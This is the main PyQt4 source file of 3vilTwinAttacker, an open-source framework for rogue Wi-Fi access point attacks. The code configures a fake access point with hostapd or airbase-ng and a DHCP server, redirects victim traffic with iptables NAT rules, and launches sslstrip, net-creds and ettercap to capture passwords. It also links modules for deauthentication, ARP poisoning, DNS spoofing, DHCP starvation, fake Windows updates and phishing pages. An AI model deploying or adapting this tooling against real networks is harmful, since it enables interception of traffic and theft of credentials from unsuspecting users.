#The MIT License (MIT)
#Copyright (c) 2015-2016 mh4x0f P0cL4bs Team
#Permission is hereby granted, free of charge, to any person obtaining a copy of
#this software and associated documentation files (the "Software"), to deal in
#the Software without restriction, including without limitation the rights to
#use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
#the Software, and to permit persons to whom the Software is furnished to do so,
#subject to the following conditions:
#The above copyright notice and this permission notice shall be included in all
#copies or substantial portions of the Software.
#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
#FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
#COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
#IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
#CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
from PyQt4.QtGui import *
from PyQt4.QtCore import *
from shutil import move
from sys import argv
import logging
from re import search
from time import asctime
from subprocess import Popen,PIPE,STDOUT,call
from Modules.ModuleStarvation import frm_dhcp_main
from Modules.ModuleDeauth import frm_window
from Modules.ModuleMacchanger import frm_mac_generator
from Modules.ModuleProbeRequest import frm_PMonitor
from Modules.ModuleUpdateFake import frm_update_attack
from Modules.ModuleArpPosion import frm_Arp_Poison
from Modules.Credentials import frm_get_credentials,frm_NetCredsLogger
from Modules.ModuleDnsSpoof import frm_DnsSpoof
from Modules.ModuleTemplates import frm_template
from Modules.utils import ProcessThread,Refactor,setup_logger,set_monitor_mode
from Core.Settings import frm_Settings
from Core.about import frmAbout
from twisted.web import http
from twisted.internet import reactor
from Plugins.sslstrip.StrippingProxy import StrippingProxy
from Plugins.sslstrip.URLMonitor import URLMonitor
from Plugins.sslstrip.CookieCleaner import CookieCleaner
from os import geteuid,system,path,getcwd,chdir,popen,listdir
if search('/usr/share/',argv[0]):chdir('/usr/share/3vilTwinAttacker/')
author      = ' @mh4x0f P0cl4bs Team'
emails      = ['mh4root@gmail.com','p0cl4bs@gmail.com']
license     = 'MIT License (MIT)'
version     = '0.6.7'
update      = '11/05/2015'
desc        = ['Framework for Rogue Wi-Fi Access Point Attacks']

class Initialize(QMainWindow):
    def __init__(self, parent=None):
        super(Initialize, self).__init__(parent)
        self.form_widget    = SubMain(self)
        self.FSettings         = frm_Settings()
        self.setCentralWidget(self.form_widget)
        self.setWindowTitle('3vilTwin-Attacker v' + version)
        self.loadtheme(self.FSettings.XmlThemeSelected())

    def loadtheme(self,theme):
        sshFile=("Core/%s.qss"%(theme))
        with open(sshFile,"r") as fh:
            self.setStyleSheet(fh.read())

    def center(self):
        frameGm = self.frameGeometry()
        centerPoint = QDesktopWidget().availableGeometry().center()
        frameGm.moveCenter(centerPoint)
        self.move(frameGm.topLeft())

    def closeEvent(self, event):
        outputiwconfig = popen('iwconfig').readlines()
        self.interface  = self.FSettings.xmlSettings('interface',
        'monitor_mode',None,False)
        for i in outputiwconfig:
            if search('Mode:Monitor',i):
                reply = QMessageBox.question(self,
                'About Exit','Are you sure to quit?', QMessageBox.Yes |
                    QMessageBox.No, QMessageBox.No)
                if reply == QMessageBox.Yes:
                    event.accept()
                    set_monitor_mode(i.split()[0]).setDisable()
                    return
                event.ignore()

class ThRunDhcp(QThread):
    def __init__(self,args):
        QThread.__init__(self)
        self.args = args
        self.process = None

    def run(self):
        print 'Starting Thread:' + self.objectName()
        self.process = p = Popen(self.args,
        stdout=PIPE,stderr=STDOUT)
        setup_logger('dhcp', './Logs/dhcp.log')
        loggerDhcp = logging.getLogger('dhcp')
        loggerDhcp.info('---[ Start DHCP '+asctime()+']---')
        for line,data in enumerate(iter(p.stdout.readline, b'')):
            print data.rstrip()
            if line > 4:
                self.emit(SIGNAL('Activated( QString )'),data.rstrip())
                loggerDhcp.info(data.rstrip())

    def stop(self):
        print 'Stop thread:' + self.objectName()
        if self.process is not None:
            self.process.terminate()
            self.process = None

class Threadsslstrip(QThread):
    def __init__(self,port):
        QThread.__init__(self)
        self.port = port
    def run(self):
        print 'Starting Thread:' + self.objectName()
        listenPort   = self.port
        spoofFavicon = False
        killSessions = True
        print 'SSLstrip v0.9 by Moxie Marlinspike Thread::online'
        URLMonitor.getInstance().setFaviconSpoofing(spoofFavicon)
        CookieCleaner.getInstance().setEnabled(killSessions)
        strippingFactory              = http.HTTPFactory(timeout=10)
        strippingFactory.protocol     = StrippingProxy
        reactor.listenTCP(int(listenPort), strippingFactory)
        reactor.run(installSignalHandlers=False)
    def stop(self):
        print 'Stop thread:' + self.objectName()
        try:
            reactor.stop()
        except:pass

class PopUpPlugins(QWidget):
    def __init__(self):
        QWidget.__init__(self)
        self.layout = QVBoxLayout(self)
        self.title = QLabel('::Available Plugins::')
        self.check_sslstrip = QCheckBox('::ssLstrip')
        self.check_netcreds = QCheckBox('::net-creds')
        self.check_sslstrip.setChecked(True)
        self.check_netcreds.setChecked(True)
        self.layout.addWidget(self.title)
        self.layout.addWidget(self.check_sslstrip)
        self.layout.addWidget(self.check_netcreds)

class PopUpServer(QWidget):
    def __init__(self,FSettings):
        QWidget.__init__(self)
        self.FSettings  = FSettings
        self.layout     = QVBoxLayout(self)
        self.FormLayout = QFormLayout()
        self.GridForm   = QGridLayout()
        self.StatusLabel        = QLabel(self)
        self.title              = QLabel('::Server-HTTP::')
        self.checkRedirectIP    = QCheckBox('Add Redirect Rules')
        self.btntemplates       = QPushButton('Templates')
        self.btnStopServer      = QPushButton('Stop Server')
        self.btnRefresh         = QPushButton('ReFresh')
        self.txt_IP             = QLineEdit(self)
        self.ComboIface         = QComboBox(self)
        self.checkRedirectIP.setFixedHeight(30)
        self.StatusServer(False)
        #icons
        self.btntemplates.setIcon(QIcon('rsc/page.png'))
        self.btnStopServer.setIcon(QIcon('rsc/close.png'))
        self.btnRefresh.setIcon(QIcon('rsc/refresh.png'))

        #conects
        self.refrash_interface()
        self.btntemplates.clicked.connect(self.show_template_dialog)
        self.btnStopServer.clicked.connect(self.StopLocalServer)
        self.btnRefresh.clicked.connect(self.refrash_interface)
        self.checkRedirectIP.clicked.connect(self.addRulesRedirect)
        self.connect(self.ComboIface, SIGNAL("currentIndexChanged(QString)"), self.discoveryIface)

        #layout
        self.GridForm.addWidget(self.txt_IP,0,0)
        self.GridForm.addWidget(self.ComboIface,0,1)
        self.GridForm.addWidget(self.btnRefresh,0,2)
        self.GridForm.addWidget(self.checkRedirectIP,1,0)
        self.GridForm.addWidget(self.btntemplates,1,1)
        self.GridForm.addWidget(self.btnStopServer,1,2)
        self.FormLayout.addRow(self.title)
        self.FormLayout.addRow(self.GridForm)
        self.FormLayout.addRow('Status::',self.StatusLabel)
        self.layout.addLayout(self.FormLayout)

    def addRulesRedirect(self):
        if self.checkRedirectIP.isChecked():
            item = QListWidgetItem()
            item.setText('iptables -t nat -A PREROUTING -p '+
            'tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80')
            item.setSizeHint(QSize(30,30))
            self.FSettings.ListRules.addItem(item)
            self.FSettings.check_redirect.setChecked(True)
            return
        items = []
        for index in xrange(self.FSettings.ListRules.count()):
            items.append(str(self.FSettings.ListRules.item(index).text()))
        for i,j in enumerate(items):
            if search('--to-destination 10.0.0.1:80',j):
                self.FSettings.ListRules.takeItem(i)
                self.FSettings.check_redirect.setChecked(False)


    def emit_template(self,log):
        if log == 'started':
            self.StatusServer(True)

    def StopLocalServer(self):
        self.StatusServer(False)
        self.Ftemplates.killThread()

    def StatusServer(self,server):
        if server:
            self.StatusLabel.setText('[ ON ]')
            self.StatusLabel.setStyleSheet('QLabel {  color : green; }')
        elif not server:
            self.StatusLabel.setText('[ OFF ]')
            self.StatusLabel.setStyleSheet('QLabel {  color : red; }')

    def refrash_interface(self):
        self.ComboIface.clear()
        n = Refactor.get_interfaces()['all']
        for i,j in enumerate(n):
            if search('at',j) or search('wlan',j):
                self.ComboIface.addItem(n[i])
                self.discoveryIface()

    def discoveryIface(self):
        iface = str(self.ComboIface.currentText())
        ip = Refactor.get_Ipaddr(iface)
        self.txt_IP.setText(ip)

    def show_template_dialog(self):
        self.Ftemplates = frm_template()
        self.connect(self.Ftemplates,SIGNAL('Activated ( QString ) '), self.emit_template)
        self.Ftemplates.setWindowTitle('Templates Phishing Attack')
        self.Ftemplates.txt_redirect.setText(self.txt_IP.text())
        self.Ftemplates.show()

class SubMain(QWidget):
    def __init__(self, parent = None):
        super(SubMain, self).__init__(parent)
        #self.create_sys_tray()
        self.Main           = QVBoxLayout()
        self.interface      = 'None'
        self.Apthreads      = {'RougeAP': []}
        self.PortRedirect   = None
        self.Ap_iface       = None
        self.ProgramCheck   = []
        self.FSettings      = frm_Settings()
        self.PopUpPlugins   = PopUpPlugins()
        self.setGeometry(0, 0, 300, 400)
        self.intGUI()

    def intGUI(self):
        self.myQMenuBar = QMenuBar(self)
        self.myQMenuBar.setFixedWidth(400)
        self.StatusBar = QStatusBar()
        self.StatusBar.setFixedHeight(15)
        self.StatusBar.addWidget(QLabel("::Access|Point::"))
        self.StatusDhcp = QLabel("")
        self.Started(False)

        Menu_file = self.myQMenuBar.addMenu('&File')
        exportAction = QAction('exportToHtml', self)
        deleteAction = QAction('Clear Logger', self)
        exitAction = QAction('Exit', self)
        exitAction.setIcon(QIcon('rsc/close-pressed.png'))
        deleteAction.setIcon(QIcon('rsc/delete.png'))
        exportAction.setIcon(QIcon('rsc/export.png'))
        Menu_file.addAction(exportAction)
        Menu_file.addAction(deleteAction)
        Menu_file.addAction(exitAction)
        exitAction.triggered.connect(exit)
        deleteAction.triggered.connect(self.delete_logger)
        exportAction.triggered.connect(self.exportHTML)

        Menu_View = self.myQMenuBar.addMenu('&View')
        phishinglog = QAction('Credentials Phishing', self)
        netcredslog = QAction('Credentials NetCreds', self)
        #connect
        phishinglog.triggered.connect(self.credentials)
        netcredslog.triggered.connect(self.logsnetcreds)
        #icons
        phishinglog.setIcon(QIcon('rsc/password.png'))
        netcredslog.setIcon(QIcon('rsc/logger.png'))
        Menu_View.addAction(phishinglog)
        Menu_View.addAction(netcredslog)

        #tools Menu
        Menu_tools = self.myQMenuBar.addMenu('&Tools')
        ettercap = QAction('Active Ettercap', self)
        btn_drift = QAction('Active DriftNet', self)
        btn_drift.setShortcut('Ctrl+Y')
        ettercap.setShortcut('Ctrl+E')
        ettercap.triggered.connect(self.start_etter)
        btn_drift.triggered.connect(self.start_dift)

        # icons tools
        ettercap.setIcon(QIcon('rsc/ettercap.png'))
        btn_drift.setIcon(QIcon('rsc/capture.png'))
        Menu_tools.addAction(ettercap)
        Menu_tools.addAction(btn_drift)

        #menu module
        Menu_module = self.myQMenuBar.addMenu('&Modules')
        btn_deauth = QAction('Deauth Attack', self)
        btn_probe = QAction('Probe Request',self)
        btn_mac = QAction('Mac Changer', self)
        btn_dhcpStar = QAction('DHCP S. Attack',self)
        btn_winup = QAction('Windows Update',self)
        btn_arp = QAction('Arp Posion Attack',self)
        btn_dns = QAction('Dns Spoof Attack',self)
        action_settings = QAction('Settings',self)

        # Shortcut modules
        btn_deauth.setShortcut('Ctrl+W')
        btn_probe.setShortcut('Ctrl+K')
        btn_mac.setShortcut('Ctrl+M')
        btn_dhcpStar.setShortcut('Ctrl+H')
        btn_winup.setShortcut('Ctrl+N')
        btn_dns.setShortcut('ctrl+D')
        btn_arp.setShortcut('ctrl+Q')
        action_settings.setShortcut('Ctrl+X')

        #connect buttons
        btn_probe.triggered.connect(self.showProbe)
        btn_deauth.triggered.connect(self.formDauth)
        btn_mac.triggered.connect(self.form_mac)
        btn_dhcpStar.triggered.connect(self.show_dhcpDOS)
        btn_winup.triggered.connect(self.show_windows_update)
        btn_arp.triggered.connect(self.show_arp_posion)
        btn_dns.triggered.connect(self.show_dns_spoof)
        action_settings.triggered.connect(self.show_settings)

        #icons Modules
        btn_arp.setIcon(QIcon('rsc/arp_.png'))
        btn_winup.setIcon(QIcon('rsc/arp.png'))
        btn_dhcpStar.setIcon(QIcon('rsc/dhcp.png'))
        btn_mac.setIcon(QIcon('rsc/mac.png'))
        btn_probe.setIcon(QIcon('rsc/probe.png'))
        btn_deauth.setIcon(QIcon('rsc/deauth.png'))
        btn_dns.setIcon(QIcon('rsc/dns_spoof.png'))
        action_settings.setIcon(QIcon('rsc/setting.png'))

        # add modules menu
        Menu_module.addAction(btn_deauth)
        Menu_module.addAction(btn_probe)
        Menu_module.addAction(btn_mac)
        Menu_module.addAction(btn_dhcpStar)
        Menu_module.addAction(btn_winup)
        Menu_module.addAction(btn_arp)
        Menu_module.addAction(btn_dns)
        Menu_module.addAction(action_settings)

        #menu extra
        Menu_extra= self.myQMenuBar.addMenu('&Help')
        Menu_about = QAction('About',self)
        Menu_issue = QAction('Submit issue',self)
        Menu_about.setIcon(QIcon('rsc/about.png'))
        Menu_issue.setIcon(QIcon('rsc/report.png'))
        Menu_about.triggered.connect(self.about)
        Menu_issue.triggered.connect(self.issue)
        Menu_extra.addAction(Menu_issue)
        Menu_extra.addAction(Menu_about)


        self.EditGateway = QLineEdit(self)
        self.EditApName = QLineEdit(self)
        self.EditChannel = QLineEdit(self)
        self.selectCard = QComboBox(self)
        self.ListLoggerDhcp = QListWidget(self)
        self.ListLoggerDhcp.setFixedHeight(150)
        self.EditGateway.setFixedWidth(120)
        self.EditApName.setFixedWidth(120)
        self.EditChannel.setFixedWidth(120)
        #edits
        self.mConfigure()
        self.FormGroup1 = QFormLayout()
        self.FormGroup2 = QFormLayout()
        self.FormGroup3 = QFormLayout()

        # get logo
        vbox = QVBoxLayout()
        vbox.setMargin(5)
        vbox.addStretch(20)
        self.FormGroup1.addRow(vbox)
        self.logo = QPixmap(getcwd() + '/rsc/logo.png')
        self.imagem = QLabel()
        self.imagem.setPixmap(self.logo)
        self.FormGroup1.addRow(self.imagem)

        #popup settings
        self.btnPlugins = QToolButton(self)
        self.btnPlugins.setFixedHeight(25)
        self.btnPlugins.setIcon(QIcon('rsc/plugins.png'))
        self.btnPlugins.setText('[::Plugins::]')
        self.btnPlugins.setPopupMode(QToolButton.MenuButtonPopup)
        self.btnPlugins.setMenu(QMenu(self.btnPlugins))
        action = QWidgetAction(self.btnPlugins)
        action.setDefaultWidget(self.PopUpPlugins)
        self.btnPlugins.menu().addAction(action)

        self.btnHttpServer = QToolButton(self)
        self.btnHttpServer.setFixedHeight(25)
        self.btnHttpServer.setIcon(QIcon('rsc/phishing.png'))
        self.FormPopup = PopUpServer(self.FSettings)
        self.btnHttpServer.setPopupMode(QToolButton.MenuButtonPopup)
        self.btnHttpServer.setMenu(QMenu(self.btnHttpServer))
        action = QWidgetAction(self.btnHttpServer)
        action.setDefaultWidget(self.FormPopup)
        self.btnHttpServer.menu().addAction(action)

        self.GroupAP = QGroupBox()
        self.GroupAP.setTitle('Access Point::')
        self.FormGroup3.addRow('Gateway:', self.EditGateway)
        self.FormGroup3.addRow('AP Name:', self.EditApName)
        self.FormGroup3.addRow('Channel:', self.EditChannel)
        self.GroupAP.setLayout(self.FormGroup3)

        # grid network adapter fix
        self.btrn_refresh = QPushButton('Refresh')
        self.btrn_refresh.setIcon(QIcon('rsc/refresh.png'))
        self.btrn_refresh.clicked.connect(self.refrash_interface)

        self.layout = QFormLayout()
        self.GroupAdapter = QGroupBox()
        self.GroupAdapter.setFixedWidth(120)
        self.GroupAdapter.setTitle('Network Adapter::')
        self.layout.addRow(self.selectCard)
        self.layout.addRow(self.btrn_refresh)
        self.layout.addRow(self.btnPlugins,self.btnHttpServer)
        self.GroupAdapter.setLayout(self.layout)

        self.btn_start_attack = QPushButton('Start Attack', self)
        self.btn_start_attack.setIcon(QIcon('rsc/start.png'))
        self.btn_cancelar = QPushButton('Stop Attack', self)
        self.btn_cancelar.setIcon(QIcon('rsc/Stop.png'))
        self.btn_cancelar.clicked.connect(self.kill)
        self.btn_start_attack.clicked.connect(self.StartApFake)

        hBox = QHBoxLayout()
        hBox.addWidget(self.btn_start_attack)
        hBox.addWidget(self.btn_cancelar)

        self.slipt = QHBoxLayout()
        self.slipt.addWidget(self.GroupAP)
        self.slipt.addWidget(self.GroupAdapter)

        self.FormGroup2.addRow(hBox)
        self.FormGroup2.addRow(self.ListLoggerDhcp)
        self.FormGroup2.addRow(self.StatusBar)
        self.Main.addLayout(self.FormGroup1)
        self.Main.addLayout(self.slipt)
        self.Main.addLayout(self.FormGroup2)
        self.setLayout(self.Main)

    def show_arp_posion(self):
        self.Farp_posion = frm_Arp_Poison()
        self.Farp_posion.setGeometry(0, 0, 450, 300)
        self.Farp_posion.show()

    def show_settings(self):
        self.FSettings.show()

    def show_windows_update(self):
        self.FWinUpdate = frm_update_attack()
        self.FWinUpdate.setGeometry(QRect(100, 100, 450, 300))
        self.FWinUpdate.show()

    def show_dhcpDOS(self):
        self.Fstar = frm_dhcp_main()
        self.Fstar.setGeometry(QRect(100, 100, 450, 200))
        self.Fstar.show()

    def showProbe(self):
        self.Fprobe = frm_PMonitor()
        self.Fprobe.setGeometry(QRect(100, 100, 400, 400))
        self.Fprobe.show()

    def formDauth(self):
        self.Fdeauth = frm_window()
        self.Fdeauth.setGeometry(QRect(100, 100, 200, 200))
        self.Fdeauth.show()

    def form_mac(self):
        self.Fmac = frm_mac_generator()
        self.Fmac.setGeometry(QRect(100, 100, 300, 100))
        self.Fmac.show()

    def show_dns_spoof(self):
        self.Fdns = frm_DnsSpoof()
        self.Fdns.setGeometry(QRect(100, 100, 450, 300))
        self.Fdns.show()

    def credentials(self):
        self.Fcredentials = frm_get_credentials()
        self.Fcredentials.setWindowTitle('Get credentials Phishing')
        self.Fcredentials.show()

    def logsnetcreds(self):
        self.FnetCreds = frm_NetCredsLogger()
        self.FnetCreds.setWindowTitle('NetCreds Logger')
        self.FnetCreds.show()

    def Started(self,bool):
        if bool:
            self.StatusDhcp.setText("[ON]")
            self.StatusDhcp.setStyleSheet("QLabel {  color : green; }")
        else:
            self.StatusDhcp.setText("[OFF]")
            self.StatusDhcp.setStyleSheet("QLabel {  color : red; }")
        self.StatusBar.addWidget(self.StatusDhcp)

    def dhcpLog(self,log):
        self.ListLoggerDhcp.addItem(log)
        self.ListLoggerDhcp.scrollToBottom()

    def mConfigure(self):
        self.get_interfaces = Refactor.get_interfaces()
        try:
            self.EditGateway.setText(
            [self.get_interfaces[x] for x in self.get_interfaces.keys() if x == 'gateway'][0])
        except:pass
        self.EditApName.setText(self.FSettings.xmlSettings('AP', 'name',None,False))
        self.EditChannel.setText(self.FSettings.xmlSettings('channel', 'mchannel',None,False))
        self.PortRedirect = self.FSettings.xmlSettings('redirect', 'port',None,False)
        for i,j in enumerate(self.get_interfaces['all']):
            if search('wlan', j):self.selectCard.addItem(self.get_interfaces['all'][i])
        driftnet = popen('which driftnet').read().split('\n')
        ettercap = popen('which ettercap').read().split('\n')
        dhcpd = popen('which dhcpd').read().split("\n")
        dnsmasq = popen('which dnsmasq').read().split("\n")
        hostapd = popen('which hostapd').read().split("\n")
        lista = [ '/usr/sbin/airbase-ng', ettercap[0],driftnet[0],dhcpd[0],dnsmasq[0],hostapd[0]]
        for i in lista:self.ProgramCheck.append(path.isfile(i))

    def exportHTML(self):
        contents = Refactor.exportHtml()
        filename = QFileDialog.getSaveFileNameAndFilter(self,
        'Save File Logger HTML','report.html','HTML (*.html)')
        if len(filename) != 0:
            with open(str(filename[0]),'w') as filehtml:
                filehtml.write(contents),filehtml.close()
            QMessageBox.information(self, '3vilTwinAttacker', 'file has been saved with success.')

    def refrash_interface(self):
        self.selectCard.clear()
        n = Refactor.get_interfaces()['all']
        for i,j in enumerate(n):
            if search('wlan', j):
                self.selectCard.addItem(n[i])

    def kill(self):
        if self.Apthreads['RougeAP'] == []:return
        for i in self.Apthreads['RougeAP']:i.stop()
        for kill in self.SettingsAP['kill']:popen(kill)
        set_monitor_mode(self.interface).setDisable()
        self.Started(False)
        Refactor.set_ip_forward(0)
        self.ListLoggerDhcp.clear()

    def delete_logger(self):
        if listdir('Logs')!= '':
            resp = QMessageBox.question(self, 'About Delete Logger',
                'do you want to delete Logs?',QMessageBox.Yes |
                    QMessageBox.No, QMessageBox.No)
            if resp == QMessageBox.Yes:
                system('rm Logs/*.log')
                system('rm Logs/Caplog/*.cap')

    def start_etter(self):
        if self.ProgramCheck[1]:
            if search(str(self.Ap_iface),str(popen('ifconfig').read())):
                call(['sudo', 'xterm', '-geometry', '73x25-1+50',
                '-T', 'ettercap', '-s', '-sb', '-si', '+sk', '-sl',
                    '5000', '-e', 'ettercap', '-p', '-u', '-T', '-q', '-w',
                      'Logs/passwords', '-i', self.Ap_iface])
            return
        QMessageBox.information(self,'ettercap','ettercap not found.')
    def start_dift(self):
        if self.ProgramCheck[2]:
            if search(str(self.Ap_iface),str(popen('ifconfig').read())):
                call(['sudo', 'xterm', '-geometry', '75x15+1+200',
                    '-T', 'DriftNet', '-e', 'driftnet', '-i', self.Ap_iface])
            return
        QMessageBox.information(self,'driftnet','driftnet not found.')

    def CoreSettings(self):
        range_dhcp = self.FSettings.xmlSettings('Iprange', 'range',None,False)
        self.PortRedirect = self.FSettings.xmlSettings('redirect', 'port',None,False)
        self.SettingsAP = {
        'interface':
            [
                'ifconfig %s up'%(self.Ap_iface),
                'ifconfig %s 10.0.0.1 netmask 255.255.255.0'%(self.Ap_iface),
                'ifconfig %s mtu 1400'%(self.Ap_iface),
                'route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1'
            ],
        'kill':
            [
                'iptables --flush',
                'iptables --table nat --flush',
                'iptables --delete-chain',
                'iptables --table nat --delete-chain',
                'killall dhpcd',
                'killall dnsmasq'
            ],
        'hostapd':
            [
                'interface={}\n'.format(str(self.selectCard.currentText())),
                'driver=nl80211\n',
                'ssid={}\n'.format(str(self.EditApName.text())),
                'channel={}\n'.format(str(self.EditChannel.text())),
            ],
        'dhcp-server':
            [
                'authoritative;\n',
                'default-lease-time 600;\n',
                'max-lease-time 7200;\n',
                'subnet 10.0.0.0 netmask 255.255.255.0 {\n',
                'option routers 10.0.0.1;\n',
                'option subnet-mask 255.255.255.0;\n',
                'option domain-name \"%s\";\n'%(str(self.EditApName.text())),
                'option domain-name-servers 10.0.0.1;\n',
                'range %s;\n'% range_dhcp,
                '}',
            ],
        'dnsmasq':
            [
                'interface=%s\n'%(self.Ap_iface),
                'dhcp-range=10.0.0.1,10.0.0.50,12h\n',
                'dhcp-option=3, 10.0.0.1\n',
                'dhcp-option=6, 10.0.0.1\n',
                'addn-hosts='+ getcwd() + '/Settings/dnsmasq.hosts\n'
            ]
        }
        Refactor.set_ip_forward(1)
        for i in self.SettingsAP['interface']:popen(i)
        for i in self.SettingsAP['kill']:popen(i)
        dhcp_select = self.FSettings.xmlSettings('dhcp','dhcp_server',None,False)
        if dhcp_select != 'dnsmasq':
            with open('Settings/dhcpd.conf','w') as dhcp:
                for i in self.SettingsAP['dhcp-server']:dhcp.write(i)
                dhcp.close()
                if path.isfile('/etc/dhcp/dhcpd.conf'):
                    system('rm /etc/dhcp/dhcpd.conf')
                move('Settings/dhcpd.conf', '/etc/dhcp/')
        else:
            with open('Settings/dnsmasq.conf','w') as dhcp:
                for i in self.SettingsAP['dnsmasq']:
                    dhcp.write(i)
                dhcp.close()

    def StartApFake(self):
        self.ListLoggerDhcp.clear()
        if geteuid() != 0:
            return QMessageBox.warning(self,'Error permission','Run as root ')
        if len(self.selectCard.currentText()) == 0:
            return QMessageBox.warning(self,'Error interface','Network interface not supported :(')
        if len(self.EditGateway.text()) == 0:
            return QMessageBox.warning(self,'Error Gateway','gateway not found')
        if not self.ProgramCheck[5]:
            return QMessageBox.information(self,'Error Hostapd','hostapd not installed')
        dhcp_select = self.FSettings.xmlSettings('dhcp','dhcp_server',None,False)
        if dhcp_select == 'iscdhcpserver':
            if not self.ProgramCheck[3]:
                return QMessageBox.warning(self,'Error dhcp','isc-dhcp-server not installed')
        elif dhcp_select == 'dnsmasq':
            if not self.ProgramCheck[4]:
                return QMessageBox.information(self,'Error dhcp','dnsmasq not installed')


        self.APactived = self.FSettings.xmlSettings('accesspoint','actived',None,False)
        if self.APactived == 'airbase-ng':
            self.interface = str(set_monitor_mode(self.selectCard.currentText()).setEnable())
            self.FSettings.xmlSettings('interface', 'monitor_mode',self.interface,False)
            # airbase thread
            Thread_airbase = ProcessThread(['airbase-ng',
            '-c', str(self.EditChannel.text()), '-e', self.EditApName.text(),
            '-F', 'Logs/Caplog/'+asctime(),self.interface])
            Thread_airbase.name = 'Airbase-ng'
            self.Apthreads['RougeAP'].append(Thread_airbase)
            Thread_airbase.start()
            # settings
            while True:
                if Thread_airbase.iface != None:
                    self.Ap_iface = [x for x in Refactor.get_interfaces()['all'] if search('at',x)][0]
                    self.FSettings.xmlSettings('netcreds', 'interface',self.Ap_iface,False)
                    break
            self.CoreSettings()
        elif self.APactived == 'hostapd':
            self.FSettings.xmlSettings('netcreds','interface',
            str(self.selectCard.currentText()),False)
            self.Ap_iface = str(self.selectCard.currentText())
            call(['airmon-ng', 'check' ,'kill'])
            self.CoreSettings()
            ignore = ('interface=','driver=','ssid=','channel=')
            with open('Settings/hostapd.conf','w') as apconf:
                for i in self.SettingsAP['hostapd']:apconf.write(i)
                for config in str(self.FSettings.ListHostapd.toPlainText()).split('\n'):
                    if not config.startswith('#') and len(config) > 0:
                        if not config.startswith(ignore):
                            apconf.write(config+'\n')
                apconf.close()
            Thread_hostapd = ProcessThread(['hostapd','Settings/hostapd.conf'])
            Thread_hostapd.name = 'hostapd'
            self.Apthreads['RougeAP'].append(Thread_hostapd)
            Thread_hostapd.start()

        # thread dhcp
        selected_dhcp = self.FSettings.xmlSettings('dhcp','dhcp_server',None,False)
        if selected_dhcp == 'iscdhcpserver':
            Thread_dhcp = ThRunDhcp(['sudo','dhcpd','-d','-f','-cf',
            '/etc/dhcp/dhcpd.conf',self.Ap_iface])
            self.connect(Thread_dhcp,SIGNAL('Activated ( QString ) '), self.dhcpLog)
            Thread_dhcp.setObjectName('DHCP')
            self.Apthreads['RougeAP'].append(Thread_dhcp)
            Thread_dhcp.start()

        elif selected_dhcp == 'dnsmasq':
            Thread_dhcp = ThRunDhcp(['dnsmasq','-C','Settings/dnsmasq.conf','-d'])
            self.connect(Thread_dhcp ,SIGNAL('Activated ( QString ) '), self.dhcpLog)
            Thread_dhcp .setObjectName('DHCP')
            self.Apthreads['RougeAP'].append(Thread_dhcp)
            Thread_dhcp .start()
        else:return QMessageBox.information(self,'DHCP',selected_dhcp + ' not found.')
        self.Started(True)

        # thread plugins
        if self.PopUpPlugins.check_sslstrip.isChecked():
            Thread_sslstrip = Threadsslstrip(self.PortRedirect)
            Thread_sslstrip.setObjectName("sslstrip")
            self.Apthreads['RougeAP'].append(Thread_sslstrip)
            Thread_sslstrip.start()

        if self.PopUpPlugins.check_netcreds.isChecked():
            Thread_netcreds = ProcessThread(['python','Plugins/net-creds/net-creds.py','-i',
            self.FSettings.xmlSettings('netcreds', 'interface',None,False)])
            Thread_netcreds.setName('Net-Creds')
            self.Apthreads['RougeAP'].append(Thread_netcreds)
            Thread_netcreds.start()

        iptables = []
        for index in xrange(self.FSettings.ListRules.count()):
           iptables.append(str(self.FSettings.ListRules.item(index).text()))
        for rules in iptables:
            if search('PREROUTING -p udp -j DNAT --to',rules):
                popen(rules.replace('$$',str(self.EditGateway.text())))
            elif search('--append FORWARD --in-interface',rules):popen(rules.replace('$$',self.Ap_iface))
            elif search('--append POSTROUTING --out-interface',rules):
                popen(rules.replace('$$',str(Refactor.get_interfaces()['activated'])))
            else:
                popen(rules)

    def create_sys_tray(self):
        self.sysTray = QSystemTrayIcon(self)
        self.sysTray.setIcon(QIcon('rsc/icon.ico'))
        self.sysTray.setVisible(True)
        self.connect(self.sysTray,
        SIGNAL('activated(QSystemTrayIcon::ActivationReason)'),
        self.on_sys_tray_activated)
        self.sysTrayMenu = QMenu(self)
        self.sysTrayMenu.addAction('FOO')

    def on_sys_tray_activated(self, reason):
        if reason == 3:self.showNormal()
        elif reason == 2:self.showMinimized()

    def about(self):
        self.Fabout = frmAbout(author,emails,
        version,update,license,desc)
        self.Fabout.show()

    def issue(self):
        url = QUrl('https://github.com/P0cL4bs/3vilTwinAttacker/issues/new')
        if not QDesktopServices.openUrl(url):
            QMessageBox.warning(self, 'Open Url', 'Could not open url')